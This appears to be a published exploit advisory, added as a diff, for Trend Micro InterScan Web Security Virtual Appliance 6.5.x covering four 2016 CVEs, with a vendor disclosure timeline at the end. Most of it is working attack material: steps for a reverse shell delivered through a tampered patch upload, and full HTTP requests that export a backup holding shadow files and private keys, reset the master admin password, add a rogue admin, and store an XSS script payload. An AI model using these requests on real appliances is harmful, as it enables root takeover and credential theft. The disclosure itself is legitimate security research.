@@ -1,0 +1,154 @@
+# Exploit Title: [Trend Micro Interscan Web Security Virtual Appliance (IWSVA) 6.5.x Multiple Vulnerabilities]
+# Date: [28/11/2016]
+# Exploit Author: [SlidingWindow] , Twitter: @Kapil_Khot
+# Vendor Homepage: [http://www.trendmicro.com/us/enterprise/network-security/interscan-web-security/virtual-appliance/]
+# Version: [Tested on  IWSVA version 6.5-SP2_Build_Linux_1707 and prior versions in 6.5.x series. Older versions may also be affected]
+# Tested on: [IWSVA version 6.5-SP2_Build_Linux_1707]
+# CVE : [CVE-2016-9269, CVE-2016-9314, CVE-2016-9315, CVE-2016-9316]
+# Vendor Security Bulletin: https://success.trendmicro.com/solution/1116672
+
+==================
+#Product:-
+==================
+Trend Micro ‘InterScan Web Security Virtual Appliance (IWSVA)’ is a secure web gateway that combines application control with zero-day exploit detection, advanced anti-malware and ransomware scanning, real-time web reputation, and flexible URL filtering to provide superior Internet threat protection.
+
+==================
+#Vulnerabilities:-
+==================
+Remote Command Execution, Sensitive Information Disclosure, Privilege Escalation and Stored Cross-Site-Scripting (XSS)
+
+========================
+#Vulnerability Details:-
+========================
+
+#1. Remote Command Execution Vulnerability (CVE-2016-9269):-
+
+The Trend Micro IWSVA can be managed through a web based management console which runs on port#1812. A least privileged user who could just run reports, can run commands on the server as root and gain a root shell.
+
+Proof of Concept:-
+
+a. Download the patch from here. 
+b. Edit the 'startgate_patch_apply.sh' and add your Kali machine ip to get reverse shell.
+c. Calculate the MD5 hash of 'stargate_patch.tgz'
+	md5sum stargate_patch.tgz
+d. Update the 'MD5SUM.txt' with new hash.
+e. Listen on port#443 on you Kali machine.
+f. Upload the patch to the target server:
+	http://target_server:1812/servlet/com.trend.iwss.gui.servlet.ManagePatches?action=upload
+g. You should have a root shell now.
+
+#2. Sensitive Information Disclosure Vulnerability (CVE-2016-9314):-
+
+The web management console allows administrators to backup and download current configuration of the appliance to their local machine. A low privileged user can abuse the ‘ConfigBackup’ functionality to backup system configuration and download it on his local machine. This backup file contains sensitive information like passwd/shadow files, RSA certificates, Private Keys and Default Passphrase etc.
+
+Exploitation:-
+
+A. Send following POST request to the target:
+(Replace JSESSIONID and CSRFGuardToken with the ones from your current low privileged user's session)
+
+POST /servlet/com.trend.iwss.gui.servlet.ConfigBackup?action=export HTTP/1.1
+Host: <Target_IP>:1812
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=<Low_Privileged_Users_Session_ID>
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+
+CSRFGuardToken=<Low_Privileged_Users_CSRF_TOKEN>&op=save&uploadfile=&beFullyOrPartially=0
+
+B. Send this POST request to download the backup file from server:
+
+POST /servlet/com.trend.iwss.gui.servlet.ConfigBackup?action=download HTTP/1.1
+Host: <Target_IP>:1812
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=<Low_Privileged_Users_Session_ID>
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+
+CSRFGuardToken=<Low_Privileged_Users_CSRF_TOKEN>&op=2&ImEx_success=1&pkg_name=%2Fvar%2Fiwss%2Fmigration%2Fexport%2FIWSVA6.5-SP2_Config.tar%0D%0A&backup_return=
+
+
+
+#3. Privilege Escalation Vulnerability (CVE-2016-9315):-
+
+A. Change Master Admin's password:
+
+i. Send following POST request to the target:
+(Replace JSESSIONID and CSRFGuardToken with the ones from your current low privileged user's session)
+
+POST /servlet/com.trend.iwss.gui.servlet.updateaccountadministration HTTP/1.1
+Host: <Target_IP>:1812
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=<Low_Privileged_Users_Session_ID>
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+
+CSRFGuardToken=<Low_Privileged_Users_CSRF_TOKEN>&accountop=review&allaccount=admin&allaccount=hacker2&allaccount=hacker4&allaccount=hacker&allaccount=test&accountname=admin&commonname=admin&accounttype=0&password_changed=true&PASS1=abc123&PASS2=abc123&description=Master+Administrator&role_select=0&roleid=0
+
+B. Add a new administrator account 'hacker'
+
+i. Send following POST request to the target:
+(Replace JSESSIONID and CSRFGuardToken with the ones from your current low privileged user's session)
+
+POST /servlet/com.trend.iwss.gui.servlet.updateaccountadministration HTTP/1.1
+Host: <Target_IP>:1812
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=<Low_Privileged_Users_Session_ID>
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+
+CSRFGuardToken=<Low_Privileged_Users_CSRF_TOKEN>&accountop=add&allaccount=admin&accountType=local&accountnamelocal=hacker&accounttype=0&password_changed=true&PASS1=pass1234&PASS2=pass1234&description=hackerUser&role_select=1&roleid=1
+
+#4. Stored Cross-Site-Scripting Vulnerability (CVE-2016-9316):-
+
+
+i. Send following POST request to the target:
+(Replace JSESSIONID and CSRFGuardToken with the ones from your current low privileged user's session)
+
+POST /servlet/com.trend.iwss.gui.servlet.updateaccountadministration HTTP/1.1
+Host: <Target_IP>:1812
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=<Low_Privileged_Users_Session_ID>
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 292
+
+CSRFGuardToken=<Low_Privileged_Users_CSRF_TOKEN>&accountop=add&allaccount=admin&accountType=local&accountnamelocal=hacker4"><script>alert(111)</script>&accounttype=0&password_changed=true&PASS1=pass1234&PASS2=pass1234&description=hackerUser4"><script>alert(111)</script>&role_select=1&roleid=1
+
+
+ii. The script executes when admin visits the ‘Login Accounts’ page.
+
+
+#Vulnerability Disclosure Timeline:
+
+28/10/2016: First email to disclose the vulnerability to the Trend Micro incident response team
+10/11/2016: Second email to ask for acknowledgment
+15/11/2016  Acknowledgment from the Trend Micro incident response team for the email reception and saying the vulnerability is under investigation
+15/11/2016: CVE Mitre assigned CVE-2016-9269, CVE-2016-9314, CVE-2016-9315 and CVE-2016-9316 for these vulnerabilities.
+24/11/2016: Trend Micro incident response team provided a patch for testing.
+25/11/2016: Acknowlegdement sent to Trend Micro confirming the fix.
+01/12/2016: Third email to ask for remediation status
+02/12/2016: Trend Micro incident response team responded stating that the fix will be released by the end of December 2016.
+21/12/2016: Fourth email to ask for remediation status
+21/12/2016: Trend Micro released the patch for English version.
+21/12/2016: Trend Micro incident response team responded stating that the patch for Japanese version will be released in February 2017.
+14/02/2017: Trend Micro releases Security Advisory. Link: https://success.trendmicro.com/solution/1116672
